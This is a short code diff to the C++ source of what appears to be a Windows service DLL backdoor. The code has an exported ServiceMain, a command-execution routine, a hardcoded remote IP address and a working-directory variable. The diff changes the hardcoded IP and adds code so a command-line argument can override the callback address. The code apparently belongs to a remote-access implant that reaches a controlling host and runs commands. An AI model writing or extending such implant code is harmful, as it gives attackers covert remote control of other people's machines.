@@ -9,6 +9,7 @@
 #include <string>
 #include <fstream>
 #include <stdexcept>
+#include <atlstr.h>
 
 #include "up_dll.h"
 
@@ -109,7 +110,7 @@ void exec2(cmdcall *p)
 	return;
 }
 
-std::string ip = "10.5.2.1";
+std::string ip = "10.1.215.74";
 std::string pwd = "c:\\";
 bool running = true;
 
@@ -333,6 +334,15 @@ extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc, LPCWSTR* 
 	if (!g_serviceStatusHandle)
 	{
 		return;
+	}
+
+	LPWSTR *cmdLineArgs;
+	int numArgs;
+
+	cmdLineArgs = CommandLineToArgvW(GetCommandLineW(), &numArgs);
+	if (numArgs == 2)
+	{
+		ip = CW2A(cmdLineArgs[1]);
 	}
 
 	g_serviceStatus.dwCurrentState = SERVICE_RUNNING;
